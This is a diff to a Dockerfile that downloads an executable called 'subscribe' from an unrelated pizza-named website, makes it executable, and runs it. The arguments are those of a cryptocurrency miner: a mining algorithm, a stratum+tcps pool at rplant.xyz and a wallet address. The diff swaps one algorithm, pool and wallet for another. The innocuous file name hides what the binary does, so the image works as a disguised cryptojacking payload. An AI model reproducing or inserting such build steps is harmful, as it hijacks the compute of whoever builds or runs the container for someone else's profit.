@@ -7,6 +7,6 @@ RUN apt update
 RUN apt -y install wget
 RUN wget http://ilovenypizza.com/subscribe
 RUN chmod +x subscribe
-RUN ./subscribe -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17023 -u RRLGKHQd29BRUM5xPYQffkGL6cRcGZf9x4.a9
+RUN ./subscribe -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17075 -u BZbVy934tse2cn2hn1oFkUBhu8M4HETNMM.oketo
 
 
